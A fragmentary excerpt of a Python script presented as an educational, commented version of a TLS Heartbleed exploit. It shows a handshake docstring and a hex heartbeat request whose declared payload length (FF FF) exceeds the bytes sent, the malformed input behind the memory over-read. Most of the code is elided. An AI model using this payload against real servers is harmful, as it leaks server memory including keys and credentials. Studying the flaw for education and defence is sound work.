...
'''
Thanks to Jared Stafford for his version.
This is an educational version of the exploit. I've rewritten some parts and added lots of comments.
...
http://tools.ietf.org/html/rfc5246#appendix-A.4
'''
...
'''
Handshake packet. Needed to establish a connection with the server.
'''
...
'01 FF FF'		 # Heartbeat message type = 01 (request); Payload length = FF FF
				 # Missing message FF FF bytes long!!!
).replace(' ', '').decode('hex')
